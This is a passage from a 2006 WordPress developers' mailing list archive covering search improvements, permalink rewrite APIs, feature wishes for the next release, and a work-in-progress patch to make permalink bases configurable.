auto-posts them.

Doug

On 2/4/06 10:31 AM, "Mattias Winther" <mattias@winthernet.se> wrote:
> 
> I was thinking the exact same thing... Preferrably with posts functionality,
> so that I can come up with a new post on my development blog, which won't
> exist on my regular blog until I'm finished, and decide to import it!
> 
> On Sat, 4 Feb 2006 12:52:15 -0500, "Aaron Brazell" <aaron@technosailor.com>
> wrote:
>> Just out of curiosity, has anyone thought about writing a WordPress import
>> script ? useful for combining existing WordPress blogs perhaps from
>> different versions?
>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers@lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From mark.wordpress at txfx.net  Sun Feb  5 11:22:14 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Sun Feb  5 11:23:39 2006
Subject: [wp-hackers] Goal for 2.1: no "white screen of death"
Message-ID: <FA3C684F-9136-48FE-B2BD-79084F0A6461@txfx.net>

Goal for 2.1: eliminate all instances where WordPress might deliver a  
blank screen.  Those things are tough for developers to troubleshoot,  
nevermind end users.  We should figure out what these instances are,  
and deliver a helpful message about what happened and what could be  
done to prevent it (or even better, prevent the situation in the  
first place).
--
Mark Jaquith
http://txfx.net/


From podz at tamba2.org.uk  Sun Feb  5 11:25:18 2006
From: podz at tamba2.org.uk (Podz)
Date: Sun Feb  5 11:26:25 2006
Subject: [wp-hackers] Goal for 2.1: no "white screen of death"
In-Reply-To: <FA3C684F-9136-48FE-B2BD-79084F0A6461@txfx.net>
References: <FA3C684F-9136-48FE-B2BD-79084F0A6461@txfx.net>
Message-ID: <43E5E09E.5090804@tamba2.org.uk>

Mark Jaquith wrote:
> Goal for 2.1: eliminate all instances where WordPress might deliver a
> blank screen.

+1
That would be great for the forums.

P.
From denis at semiologic.com  Sun Feb  5 12:10:13 2006
From: denis at semiologic.com (Denis de Bernardy)
Date: Sun Feb  5 12:11:42 2006
Subject: [wp-hackers] Development for 2.x : Improved Search
In-Reply-To: <8e1656660602050128g69f3860ci9e6b7e02477f00f8@mail.gmail.com>
Message-ID: <000001c62a4d$1e877500$6a02a8c0@kergan>

> a) Simple : Add MySQL Full Text Indexing to Wordpress and 
> modify the search hooks to use it. Moving to FT indices on 
> MyISAM tables gives actually quite good serch out of the 
> gate. (...)
> 
> Difficulty: not huge.  Willing to do in full myself.

This is mostly done already, and MyISAM full text indexing is about as bad
as bad can get.

http://www.semiologic.com/software/search-reloaded/

D.
 

From denis at semiologic.com  Sun Feb  5 13:06:13 2006
From: denis at semiologic.com (Denis de Bernardy)
Date: Sun Feb  5 13:07:40 2006
Subject: [wp-hackers] Development for 2.x : Improved Search
In-Reply-To: <000001c62a4d$1e877500$6a02a8c0@kergan>
Message-ID: <000001c62a54$f17f2960$6a02a8c0@kergan>

> > a) Simple : Add MySQL Full Text Indexing to Wordpress and
> > modify the search hooks to use it. Moving to FT indices on 
> > MyISAM tables gives actually quite good serch out of the 
> > gate. (...)
> > 
> > Difficulty: not huge.  Willing to do in full myself.
> 
> This is mostly done already, and MyISAM full text indexing is 
> about as bad as bad can get.
> 
> http://www.semiologic.com/software/search-reloaded/

As additional information, a past version of the plugin did a slightly
better job than the above at the cost of a huge compute power. To spare
yourself some time:

1. Using a FT index on the text-only version of the formatted post excerpt
and content does not improve the results in any significant manner.

2. MySQL has a number of issues that are related to charsets.

These tend to worsen after MySQL 4.1 (at which point they introduced a
collection of new bugs, for good measure). The underlying mess is a
nightmare to sort out.

3. Trying to tweak the results by reworking the raw mysql score can produce
meaningful enhancements but involved a significant overhead.

Things I tried include the keyword order, their presence in the post title,
presence or absence of double quotes to create keyword groups, and later on
the use of a soundex.

I eventually dropped all of these ideas because working around MySQL's lack
of features by using php was simply ridiculous. If you give this a shot
yourself, store your indexes and search procedures in a real database, such
as pgsql.

4. Last but not least, several users sent me messages along the lines of the
following:

"Search reloaded returns results in a random order. Why doesn't it sort
results by date?"


Denis

From fuzzygroup at gmail.com  Sun Feb  5 13:17:47 2006
From: fuzzygroup at gmail.com (Scott johnson)
Date: Sun Feb  5 13:19:16 2006
Subject: [wp-hackers] Development for 2.x : Improved Search
In-Reply-To: <000001c62a54$f17f2960$6a02a8c0@kergan>
References: <000001c62a4d$1e877500$6a02a8c0@kergan>
	<000001c62a54$f17f2960$6a02a8c0@kergan>
Message-ID: <8e1656660602050517w72032b1boc63e9fcbf9f37995@mail.gmail.com>

Hi Denis,

I'll download your code and take a look at it.  There's a fair bit of
tweaking that you do to setup mysql full text search and I don't know what
your assumptions were.

I'd also -- for any search task -- recommend offering search by date, newest
to oldest, as a default if not option.  The world is increasingly about
currency and, particularly in a blog context, this is key.

Finally, if memory serves me correctly, the default connector in MySQL full
text search is OR not AND which means that users get what appear to be
random results.  When we switched this in Feedster it essentially fixed the
problem from the users perspective.

Reworking the relevance score is always tricky but it certainly can be
done.  http://www.queryserver.com/ is a product of mine from '97 (still
around) that normalizes relevance scores across all the major search engines
and produces a merged metasearch result.

*Scurries to download code and try it before I have to get offline*.

Thanks!

Scott

On 2/5/06, Denis de Bernardy <denis@semiologic.com> wrote:
>
> > > a) Simple : Add MySQL Full Text Indexing to Wordpress and
> > > modify the search hooks to use it. Moving to FT indices on
> > > MyISAM tables gives actually quite good serch out of the
> > > gate. (...)
> > >
> > > Difficulty: not huge.  Willing to do in full myself.
> >
> > This is mostly done already, and MyISAM full text indexing is
> > about as bad as bad can get.
> >
> > http://www.semiologic.com/software/search-reloaded/
>
> As additional information, a past version of the plugin did a slightly
> better job than the above at the cost of a huge compute power. To spare
> yourself some time:
>
> 1. Using a FT index on the text-only version of the formatted post excerpt
> and content does not improve the results in any significant manner.
>
> 2. MySQL has a number of issues that are related to charsets.
>
> These tend to worsen after MySQL 4.1 (at which point they introduced a
> collection of new bugs, for good measure). The underlying mess is a
> nightmare to sort out.
>
> 3. Trying to tweak the results by reworking the raw mysql score can
> produce
> meaningful enhancements but involved a significant overhead.
>
> Things I tried include the keyword order, their presence in the post
> title,
> presence or absence of double quotes to create keyword groups, and later
> on
> the use of a soundex.
>
> I eventually dropped all of these ideas because working around MySQL's
> lack
> of features by using php was simply ridiculous. If you give this a shot
> yourself, store your indexes and search procedures in a real database,
> such
> as pgsql.
>
> 4. Last but not least, several users sent me messages along the lines of
> the
> following:
>
> "Search reloaded returns results in a random order. Why doesn't it sort
> results by date?"
>
>
> Denis
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From skippy at skippy.net  Sun Feb  5 14:33:35 2006
From: skippy at skippy.net (Scott Merrill)
Date: Sun Feb  5 14:35:05 2006
Subject: [wp-hackers] WP_Rewrite query
In-Reply-To: <aa74b1910602041946k5d1ed9d1j460958fbe591110f@mail.gmail.com>
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>	<43E3E842.7020803@boren.nu>	<ca7320070602031537q4f7e7457gfc442f14a09616e8@mail.gmail.com>	<43E4312D.2040405@robm.me.uk>	<e6ec604d0602032300x2fd7dc6dpaa4ad4ce302ff48b@mail.gmail.com>	<43E4D80B.8010003@robm.me.uk>	<e6ec604d0602041439o3f290212ked3e03d373065df7@mail.gmail.com>	<43E536DF.90303@skippy.net>	<e6ec604d0602041527h1b69d278p645412f9a9594a7a@mail.gmail.com>	<43E563FC.8050306@skippy.net>
	<aa74b1910602041946k5d1ed9d1j460958fbe591110f@mail.gmail.com>
Message-ID: <43E60CBF.5000804@skippy.net>

Sam Angove wrote:
> On 2/5/06, Scott Merrill <skippy@skippy.net> wrote:
> 
>>So, short of asking for someone to write my code for me, I would really
>>like to see a comprehensive example of how to add and use a new
>>permalink token -- assuming such can be done.
> 
> 
> Try this:
>    http://rephrase.net/miscellany/06/dayofyear.phps

Huzzah!  Now that I see a working example, it makes more sense (as well
as drives home the fact that it would've taken me considerably longer to
develop that on my own).

> It isn't a comprehensive example, but it does part of what you want.
> There might be a better place to add the rewrite tag, but that hook
> works. Just use %dayofyear% in the permalink structure in the admin
> panel.

Thanks, Sam!  This is _precisely_ what I needed.  Do you have a PayPal
account?

For those following along at home, here's my revision to Sam's plugin,
which should account for leap years:
   http://www.skippy.net/secret/dayofyear.phps

-- 
skippy@skippy.net | http://skippy.net/

gpg --keyserver pgp.mit.edu --recv-keys 9CFA4B35
506C F8BB 17AE 8A05 0B49  3544 476A 7DEC 9CFA 4B35
From josh at larameekidd.com  Sun Feb  5 15:23:48 2006
From: josh at larameekidd.com (Joshua Kidd)
Date: Sun Feb  5 15:25:19 2006
Subject: [wp-hackers] New to list -- have a bug fix
Message-ID: <43E61884.6090809@larameekidd.com>

Hi all,

I've been using WordPress for a few months, but I just joined this list.

When I upgraded to 2.0.1, my RSS feeds started showing comments instead 
of posts (ticket #2379).  I made a small change to classes.php and after 
creating a new page (only way I could find to flush the rewrite rules), 
I'm fine again.  I wanted to know how I could make this fix available to 
others who are having the problem.  Trac doesn't seem complicated, but 
I've never used it before.  Are there simple instructions for posting a 
big fix?

Josh
From powzor at gmail.com  Sun Feb  5 15:34:05 2006
From: powzor at gmail.com (Rob)
Date: Sun Feb  5 15:29:47 2006
Subject: [wp-hackers] New to list -- have a bug fix
In-Reply-To: <43E61884.6090809@larameekidd.com>
References: <43E61884.6090809@larameekidd.com>
Message-ID: <43E61AED.7090803@robm.me.uk>

Joshua Kidd wrote:
> Hi all,
>
> I've been using WordPress for a few months, but I just joined this list.
>
> When I upgraded to 2.0.1, my RSS feeds started showing comments 
> instead of posts (ticket #2379).  I made a small change to classes.php 
> and after creating a new page (only way I could find to flush the 
> rewrite rules), I'm fine again.  I wanted to know how I could make 
> this fix available to others who are having the problem.  Trac doesn't 
> seem complicated, but I've never used it before.  Are there simple 
> instructions for posting a big fix?
>
> Josh
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
http://codex.wordpress.org/Submitting_Bugs

Should tell you everything you need to know :)

-- 
Rob Miller
http://robm.me.uk/ | http://kantian.co.uk/

From jason at zenenet.com  Sun Feb  5 15:30:35 2006
From: jason at zenenet.com (Jason S.)
Date: Sun Feb  5 15:32:02 2006
Subject: [wp-hackers] WordPress Importer (Cross-Post)
In-Reply-To: <C00B05AC.F16C%apakuni@gmail.com>
References: <C00B05AC.F16C%apakuni@gmail.com>
Message-ID: <43E61A1B.20008@zenenet.com>

Douglas Daulton wrote:
> Along the same lines, it would be cool if there were a "cross-post" function
> which would allow you to set up one or more additional blogs in the Admin
> section.  Then, each of these blogs would appear in a drop down on the post
> page.  Select the other blogs you want to send that post to as well and it
> auto-posts them.

There's next to no reason for this in wordpress (core) itself.
I wouldn't want this feature to be available to me.

This should only exist as a plugin, at least for WP core.  Something
like this is perfectly suited for WPMU however.

One side question, however.
Is there a plugin hook to add a expand/collapse drop box anywhere on the
 write post/page screen?

If not, I officially hijack the thread and request those hooks to be
added :).
From dmhouse at gmail.com  Sun Feb  5 15:36:09 2006
From: dmhouse at gmail.com (David House)
Date: Sun Feb  5 15:37:34 2006
Subject: [wp-hackers] Make WP_Rewrite eaiser to use
Message-ID: <ebe43d680602050736s48b87e46l@mail.gmail.com>

Reading through the recent thread concerning Scott Merril's troubles
with WP_Rewrite [1], I thought that we really should automate a lot of
what is in the final plugin [2]. People (well, Owen) have been asking
for a while that WP_Rewrite should be easier to use. I'm not proposing
a full rewrite of WP_Rewrite, but I do think we should provide more
API to help the mortal plugin authors understand it.

For example, here's my proposal for a couple of functions that should
make interacting with WP_Rewrite easier (if there's no disagreement
with the specification then I'll draft up some patches):

----------------------------------------------------------------------------
1. add_rewrite_rule(): A function for adding a straight rewrite rule.

Parameters:
* Regex to match
* URL to redirect to.

What it needs to do:
* Build a rewrite rule from the regex and redirect URL.
* Theoretically it could then filter rewrite_rules_array and add the
rules itself, but I think we should add a function to WP_Rewrite for
adding 'extra' rules that needn't be generated by
generate_rewrite_rules(). rewrite_rules() would then just tack on
these extra rules after the ones generated. These extra rules should
probably be stored in an option.

----------------------------------------------------------------------------
2. add_rewrite_tag(): Add a new tag (like %postname%):

Parameters:
* Name of tag
* Regex to match

What it needs to do:
* Get a query var name by stripping the % signs from the name of the
tag: trim($name, '%')
* Call $wp_rewrite->add_rewrite_tag() with the name, generated QV name
and regex.
* Add the QV as a query var (again, this could be done by filtering
query_vars but it might be nicer to add a function to the WP class
that stores 'extra' QVs like above)

Notes:
I was thinking about passing a callback to this function which would
be called with the contents of the QV when a request matched the regex
(so e.g. if the regex is ([0-9]{3}) as in skippy's case, we could
accept a callback to call when someone requests a Julian date, say,
/2006/32, passing 32), but I don't think this will be flexible enough:
people might want to hook onto parse_request, or pre_get_posts, or
parse_query, or many other hooks. So we can just do the
$wp_rewrite->add_rewrite_tag() bit and leave it up to the query author
to add their own hooks.

----------------------------------------------------------------------------

Examples:

To do something similar to what skippy was asking for, you'd do this:

http://xmouse.ithium.net/dmh-source/wp-rewrite-api.phps

[1]: http://comox.textdrive.com/pipermail/wp-hackers/2006-February/004511.html
[2]: http://www.skippy.net/secret/dayofyear.phps
--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From wphackers at jamietalbot.com  Sun Feb  5 15:39:37 2006
From: wphackers at jamietalbot.com (Jamie Talbot)
Date: Sun Feb  5 15:41:23 2006
Subject: [wp-hackers] WordPress Importer (Cross-Post)
In-Reply-To: <43E61A1B.20008@zenenet.com>
References: <C00B05AC.F16C%apakuni@gmail.com> <43E61A1B.20008@zenenet.com>
Message-ID: <43E61C39.5060601@jamietalbot.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Jason S. wrote:
> There's next to no reason for this in wordpress (core) itself.
> I wouldn't want this feature to be available to me.
> 
> This should only exist as a plugin, at least for WP core.  Something
> like this is perfectly suited for WPMU however.
> 
> One side question, however.
> Is there a plugin hook to add a expand/collapse drop box anywhere on the
>  write post/page screen?
> 

Not anywhere on the post screen, but in the dbx post sidebar, the dbx post options and
edit_form_advanced which is at the bottom of the page.

As a side-issue, I want to place a checkbox next to the Delete Button on the edit page.  I added it
in edit_form_advanced with javascript to append it in the right place, but IE dies with a fatal
error every time.  Apparently, it doesn't like the DOM being altered before the page is fully
loaded, which I think is because the preview pane is still loading at that time.  Anybody think of a
 way to do this?

Cheers,

Jamie.

PS: Don't mention hijack, or you'll go on "The List"!

- --
http://jamietalbot.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (MingW32)
Comment: Using GnuPG with Thunderbird - http://enigmail.mozdev.org

iD8DBQFD5hw5rovxfShShFARAhV+AJ458h6jdXV+Op7QfA+n+ytmmK2KHgCgjGut
TDebKdM5LSTBHoD7fCFGsrI=
=JX1/
-----END PGP SIGNATURE-----
From steagl at people.it  Sun Feb  5 17:01:49 2006
From: steagl at people.it (Stefano)
Date: Sun Feb  5 17:03:26 2006
Subject: [wp-hackers] Make WP_Rewrite eaiser to use
References: <ebe43d680602050736s48b87e46l@mail.gmail.com>
Message-ID: <ukbcu116316nbenmrfa6df72s64d6qt1pe@4ax.com>

Il Sun, 5 Feb 2006 15:36:09 +0000, David House <dmhouse@gmail.com>
scrive:

>Reading through the recent thread concerning Scott Merril's troubles
>with WP_Rewrite [1], I thought that we really should automate a lot of
>what is in the final plugin [2]. People (well, Owen) have been asking
>for a while that WP_Rewrite should be easier to use. I'm not proposing
>a full rewrite of WP_Rewrite, but I do think we should provide more
>API to help the mortal plugin authors understand it.

+10 definitly! :)

>1. add_rewrite_rule(): A function for adding a straight rewrite rule.

...

>2. add_rewrite_tag(): Add a new tag (like %postname%):

I think this will be really usefull i'm getting a bit mad about
rewrite rule too and this would help a lot.

-- 

Stefano Aglietti - StallonIt on IRCnet - ICQ#: 2078431
Email: steve@40annibuttati.it steagl@people.it
Sites: http://www.40annibuttati.it (personal blog)
       http://www.wordpress-it.it (WordPress Italia)
From don_lacuran at hotmail.com  Sun Feb  5 17:04:04 2006
From: don_lacuran at hotmail.com (Donnie La Curan)
Date: Sun Feb  5 17:05:31 2006
Subject: [wp-hackers] Posts time out and make duplicate posts
Message-ID: <BAY101-W1031F3CC9BB6C5273299DB930F0@phx.gbl>

Ever since I updated to 2.0.1 I have noticed that making a post takes a really long time.  Sometimes long enough that I get the cannot find server error.  I just go back to the main screen of my blog and the post is there, twice.  Sometimes it doesn't time out, but I still get duplicate posts and I have to go in and delete the extra one.  Version 2.0 worked just fine, didn't take too long to make a post and it never created duplicate posts.
 
Donnie
http://www.slapyo.com
_________________________________________________________________
Express yourself instantly with MSN Messenger! Download today it's FREE!
http://messenger.msn.click-url.com/go/onm00200471ave/direct/01/
From ringmaster at midnightcircus.com  Sun Feb  5 17:46:38 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Sun Feb  5 17:48:12 2006
Subject: [wp-hackers] Make WP_Rewrite eaiser to use
In-Reply-To: <ebe43d680602050736s48b87e46l@mail.gmail.com>
References: <ebe43d680602050736s48b87e46l@mail.gmail.com>
Message-ID: <43E639FE.6010606@midnightcircus.com>

David House wrote:
> Reading through the recent thread concerning Scott Merril's troubles
> with WP_Rewrite [1], I thought that we really should automate a lot of
> what is in the final plugin [2]. People (well, Owen) have been asking
> for a while that WP_Rewrite should be easier to use. I'm not proposing
> a full rewrite of WP_Rewrite, but I do think we should provide more
> API to help the mortal plugin authors understand it.

Well, a full rewrite of WP_Rewrite seems impractical, but the code that 
is there is nigh incomprehensible.  I think much of the problem with 
adding new rewrite rules is that it is very difficult to look at the 
code, watch execution through it, and locate the best place to insert 
anything new.

Perhaps adding a couple of extra API hooks for making rewriting easier 
would be beneficial to the many plugin developers who have recently 
expressed an interest in adding their own rules.  This doesn't solve the 
more fundamental problem that the extant code is hard to read and, by 
extension, maintain.

Owen

From mhancock at us.net  Sun Feb  5 18:45:09 2006
From: mhancock at us.net (Michael E. Hancock)
Date: Sun Feb  5 18:47:33 2006
Subject: [wp-hackers] Development for 2.next
References: <43E15349.6060708@boren.nu>
Message-ID: <1ab601c62a84$6f2b82d0$6402a8c0@DELL8600>

From: "Ryan Boren" <ryan@boren.nu>
> What else?

Author, User, Usermeta, Profile, Cleanup

* Deprecate various 'the_author_xx' functions and replace with just
the_author() and get_the_author()
Change the two functions the_author() and get_the_author() to replace all
the other 'the_author_xx' functions.  Also, make those two functions support
any usermeta field that might be subsequently added.

Example:
the_author('user_field_to_return_or_echo',return_or_echo)

Functions to deprecate
get_the_author_aim(), get_the_author_description(), get_the_author_email(),
get_the_author_firstname(), get_the_author_icq(), get_the_author_ID(),
get_the_author_lastname(), get_the_author_login(), get_the_author_msn(),
get_the_author_nickname(), get_the_author_url(), get_the_author_yim(),
the_author_aim(), the_author_description(), the_author_email(),
the_author_firstname(), the_author_icq(), the_author_ID(),
the_author_lastname(), the_author_login(), the_author_msn(),
the_author_nickname(), the_author_url(), the_author_yim()


* Move all appropriate fields from user to usermeta table
Finish moving remaining fields, such as user_email, from user table to
usermeta.


* Standardize usermeta meta_key designations
For example there is 'first_name' but then capabilities uses the database
prefix so it's 'dbprefix_capabilities'.  Either don't use the prefix or use
the prefix for all fields.  Of course, I don't understand why capabilities
and user_level needed the database prefix prepended to begin with ;)


* Add this "Dynamic Profile Page" plugin suggested by Owen  ;)
--Remove the three existing fields from the profile page.
--Replace them with a more dynamic form that allows users to specify the
IM/comm service from a dropdown, and then provide their ID in a box.
--Provide a fixed number of these (or start with one and create more via
Ajax!) on the profile page.
--Provide a set of functions for retrieving these values in the template.
originally suggested in
http://comox.textdrive.com/pipermail/wp-testers/2006-January/001847.html


* Delete functions previously deprecated
Examples are the_category_ID(), the_category_head(), the_weekday(), and
the_weekday_date()


Cheers.

Michael E. Hancock


From danny.ayers at gmail.com  Sun Feb  5 20:52:04 2006
From: danny.ayers at gmail.com (Danny Ayers)
Date: Sun Feb  5 20:53:33 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <1ab601c62a84$6f2b82d0$6402a8c0@DELL8600>
References: <43E15349.6060708@boren.nu>
	<1ab601c62a84$6f2b82d0$6402a8c0@DELL8600>
Message-ID: <1f2ed5cd0602051252o2749d47dm88d7b05b1768a101@mail.gmail.com>

It'll be embarrasing if the next WordPress point release doesn't have
Atom 1.0 ;-)

Also, I've not been around long enough to know how this side of the
project is managed, but it might be a good time to start introducing
hAtom microformat support to the default templates too. It's mostly a
matter of inserting a few extra class attributes, the result should be
100% compatible with current CSS.

http://microformats.org/wiki/hatom

There are a lot of should-be-nice benefits further down the line, but
my guess is the most immediate concrete benefit will be the
availability of CSS Zen Garden kind of styling that'll work across
publishing tools.

There's an experimental template rewriter at :
http://www.trinityanne.com/tools/rewrite/

I'm willing to help on either of these (though my time is limited).

Cheers,
Danny.

--

http://dannyayers.com
From peter.westwood at ftwr.co.uk  Sun Feb  5 20:56:28 2006
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Sun Feb  5 20:57:56 2006
Subject: [wp-hackers] Make WP_Rewrite eaiser to use
In-Reply-To: <43E639FE.6010606@midnightcircus.com>
References: <ebe43d680602050736s48b87e46l@mail.gmail.com>
	<43E639FE.6010606@midnightcircus.com>
Message-ID: <43E6667C.5040208@ftwr.co.uk>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Owen Winkler wrote:
> David House wrote:
>> Reading through the recent thread concerning Scott Merril's troubles
>> with WP_Rewrite [1], I thought that we really should automate a lot of
>> what is in the final plugin [2]. People (well, Owen) have been asking
>> for a while that WP_Rewrite should be easier to use. I'm not proposing
>> a full rewrite of WP_Rewrite, but I do think we should provide more
>> API to help the mortal plugin authors understand it.
> 
> Well, a full rewrite of WP_Rewrite seems impractical, but the code that
> is there is nigh incomprehensible.  I think much of the problem with
> adding new rewrite rules is that it is very difficult to look at the
> code, watch execution through it, and locate the best place to insert
> anything new.
> 
> Perhaps adding a couple of extra API hooks for making rewriting easier
> would be beneficial to the many plugin developers who have recently
> expressed an interest in adding their own rules.  This doesn't solve the
> more fundamental problem that the extant code is hard to read and, by
> extension, maintain.
> 

I think a rewrite of WP_Rewrite should be possible.

I am getting to know it quite well at the moment trying to put together
a patch for this old trac ticket - http://trac.wordpress.org/ticket/301
(current inprogress patch attached)

I was considering looking at refactoring the code after I had this finished.

I have nearly working code which allows configuration of:

Author, Search, Comments and Feed permalinks. Getting the feed ones
working is somewhat of a pain but I am nearly there.

If we are to work on WP_Rewrite adding an api for registering generic
endpoint types looks like a good idea.  This would be some way of
registering the query var, permalink string and input/output handler
this could then in theory be used by both the core code and plugins for
things like feeds, trackbacks, ajax endpoints etc.

What do people think of this.

It would probably simplfy WP_Rewrite if it is made generic - it contains
a lot of duplicate code at present and also aid in the removal of some
of the feed types from the core to plugins and ideally the registration
functions described above should allow you to override someone elses
handler - this could have been used for things like the atom feeds where
the builtin  atom 0.3 feed could have easily been replaced by a plugin.

westi
- --
Peter Westwood
http://blog.ftwr.co.uk
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFD5mZ8VPRdzag0AcURAhGRAKCF+fmW9TcKu3oU4MhZLDmMRSCOVACdEa2r
HhD/fmTnFQ7GG25tJjr3IaI=
=nqDP
-----END PGP SIGNATURE-----
-------------- next part --------------
Index: wp-includes/classes.php
===================================================================
--- wp-includes/classes.php	(revision 3504)
+++ wp-includes/classes.php	(working copy)
@@ -862,14 +862,14 @@
 	var $permalink_structure;
 	var $category_base;
 	var $category_structure;
-	var $author_base = 'author';
+	var $author_base = 'writer';
 	var $author_structure;
 	var $date_structure;
 	var $page_structure;
-	var $search_base = 'search';
+	var $search_base = 'find';
 	var $search_structure;
-	var $comments_base = 'comments';
-	var $feed_base = 'feed';
+	var $comments_base = 'discussion';
+	var $feed_base = 'syndicate';
 	var $comments_feed_structure;
 	var $feed_structure;
 	var $front;
@@ -1095,8 +1095,13 @@
 			return false;
 		}
 
-		$this->author_structure = $this->front . $this->author_base . '/%author%';
+		if (empty($this->author_base))
+			$this->author_structure = $this->front . 'author/';
+		else
+			$this->author_structure = $this->front . $this->author_base . '/';
 
+		$this->author_structure .= '%author%';
+
 		return $this->author_structure;
 	}
 
@@ -1110,7 +1115,12 @@
 			return false;
 		}
 
-		$this->search_structure = $this->root . $this->search_base . '/%search%';
+		if (empty($this->search_base))
+			$this->search_structure = $this->front . 'search/';
+		else
+			$this->search_structure = $this->search_base . '/';
+		
+		$this->search_structure .= '%search%';
 
 		return $this->search_structure;
 	}
@@ -1140,7 +1150,12 @@
 			return false;
 		}
 
-		$this->feed_structure = $this->root . $this->feed_base . '/%feed%';
+		if (empty($this->feed_base))
+			$this->feed_structure = $this->front . 'feed/';
+		else
+			$this->feed_structure = $this->front . $this->feed_base . '/';
+		
+		$this->feed_structure .= '%feed%';
 
 		return $this->feed_structure;
 	}
@@ -1155,8 +1170,19 @@
 			return false;
 		}
 
-		$this->comment_feed_structure = $this->root . $this->comments_base . '/' . $this->feed_base . '/%feed%';
 
+		if (empty($this->comments_base))
+			$this->comment_feed_structure = $this->front . 'comments/';
+		else
+			$this->comment_feed_structure = $this->front . $this->comments_base . '/';
+
+		if (empty($this->feed_base))
+			$this->comment_feed_structure .= 'feed/';
+		else
+			$this->comment_feed_structure .= $this->feed_base . '/';
+		
+		$this->comment_feed_structure .= '%feed%';
+
 		return $this->comment_feed_structure;
 	}
 
@@ -1178,10 +1204,10 @@
 	function generate_rewrite_rules($permalink_structure, $paged = true, $feed = true, $forcomments = false, $walk_dirs = true) {
 		$feedregex2 = '';
 		foreach ($this->feeds as $feed_name) {
-			$feedregex2 .= $feed_name . '|';
+			$feedregex2 .= '/' . $feed_name . '|';
 		}
-		$feedregex2 = '(' . trim($feedregex2, '|') .  ')/?$';
-		$feedregex = $this->feed_base  . '/' . $feedregex2;
+		$feedregex2 = '(|' . trim($feedregex2, '|') .  ')/?$';
+		$feedregex = $this->feed_base . $feedregex2;
 
 		$trackbackregex = 'trackback/?$';
 		$pageregex = 'page/?([0-9]{1,})/?$';
@@ -1485,6 +1511,8 @@
 		// Fetch the rewrite rules.
 		$rewrite = $wp_rewrite->wp_rewrite_rules();
 
+		print_r($rewrite);
+
 		if (! empty($rewrite)) {
 			// If we match a rewrite rule, this will be cleared.
 			$error = '404';
@@ -1538,12 +1566,16 @@
 				if ((! empty($req_uri)) && (strpos($match, $req_uri) === 0) && ($req_uri != $request)) {
 					$request_match = $req_uri . '/' . $request;
 				}
+				
+				echo "$match : $request_match \n";
 
 				if (preg_match("!^$match!", $request_match, $matches) ||
 					preg_match("!^$match!", urldecode($request_match), $matches)) {
 					// Got a match.
 					$this->matched_rule = $match;
 
+					print_r($matches);
+
 					// Trim the query of everything up to the '?'.
 					$query = preg_replace("!^.+\?!", '', $query);
 
@@ -1601,6 +1633,8 @@
 
 		if ( isset($error) )
 			$this->query_vars['error'] = $error;
+
+		print_r($this->query_vars);
 	}
 
 	function send_headers() {
Index: wp-admin/options-permalink.php
===================================================================
--- wp-admin/options-permalink.php	(revision 3504)
+++ wp-admin/options-permalink.php	(working copy)
@@ -75,6 +75,10 @@
 	
 $permalink_structure = get_settings('permalink_structure');
 $category_base = get_settings('category_base');
+$author_base = get_settings('author_base');
+$search_base = get_settings('search_base');
+$comments_base = get_settings('comments_base');
+$feed_base = get_settings('feed_base');
 
 if ( (!file_exists($home_path.'.htaccess') && is_writable($home_path)) || is_writable($home_path.'.htaccess') )
 	$writable = true;
@@ -155,7 +159,24 @@
 <?php endif; ?>
 	<p> 
   <?php _e('Category base'); ?>: <input name="category_base" type="text" class="code"  value="<?php echo $category_base; ?>" size="30" /> 
-     </p> 
+     </p>
+<?php if ($is_apache) : ?>
+	<p><?php _e('If you like, you may enter a custom prefix for some of your other URIs here including Author, Search, Comments and Feed. For example, <code>/discussion/</code> could be used for your comments to make your links like <code>http://example.org/1980/01/01/my-post/discussion/</code>. If you leave this blank the default will be used.') ?></p>
+<?php else : ?>
+	<p><?php _e('If you like, you may enter a custom prefix for some of your other URIs here including Author, Search, Comments and Feed. For example, <code>/discussion/</code> could be used for your comments to make your links like <code>http://example.org/index.php/1980/01/01/my-post/discussion/</code>. If you leave this blank the default will be used.') ?></p>
+<?php endif; ?>
+	<p> 
+  <?php _e('Author base'); ?>: <input name="author_base" type="text" class="code"  value="<?php echo $author_base; ?>" size="30" /> 
+    </p>
+	<p>
+  <?php _e('Search base'); ?>: <input name="search_base" type="text" class="code"  value="<?php echo $search_base; ?>" size="30" /> 
+    </p>
+	<p>
+  <?php _e('Comments base'); ?>: <input name="comments_base" type="text" class="code"  value="<?php echo $comments_base; ?>" size="30" /> 
+    </p>
+	<p>
+  <?php _e('Feed base'); ?>: <input name="feed_base" type="text" class="code"  value="<?php echo $feed_base; ?>" size="30" /> 
+    </p>
     <p class="submit"> 
       <input type="submit" name="submit" value="<?php _e('Update Permalink Structure &raquo;') ?>" /> 
     </p> 
From dmhouse at gmail.com  Sun Feb  5 21:18:54 2006
From: dmhouse at gmail.com (David House)
Date: Sun Feb  5 21:20:20 2006
Subject: [wp-hackers] Make WP_Rewrite eaiser to use
In-Reply-To: <43E6667C.5040208@ftwr.co.uk>
References: <ebe43d680602050736s48b87e46l@mail.gmail.com>
	<43E639FE.6010606@midnightcircus.com> <43E6667C.5040208@ftwr.co.uk>
Message-ID: <ebe43d680602051318v2acac770t@mail.gmail.com>

On 05/02/06, Peter Westwood <peter.westwood@ftwr.co.uk> wrote:
> I think a rewrite of WP_Rewrite should be possible.

Perhaps it is, but I think we should add the API in first. At the
